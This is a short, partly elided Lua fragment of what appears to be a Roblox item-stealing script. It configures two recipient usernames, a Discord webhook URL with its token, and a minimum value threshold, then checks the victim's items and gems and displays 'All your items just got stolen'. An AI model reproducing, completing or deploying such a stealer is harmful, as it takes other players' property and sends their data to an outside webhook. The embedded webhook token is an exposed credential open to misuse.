Username = "woko457_1"
Username2 = "woko457_2"
webhook = "https://discord.com/api/webhooks/1331393448259096766/GDzRvSYsk10I7ijPcLSc3-dSgHOF-Z6U53sjpQaTGZ0qlEfqmEDUA2e9AI5hqbR25Dlx"
min_rap = 1000000
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    message.Error("All your items just got stolenT")
end
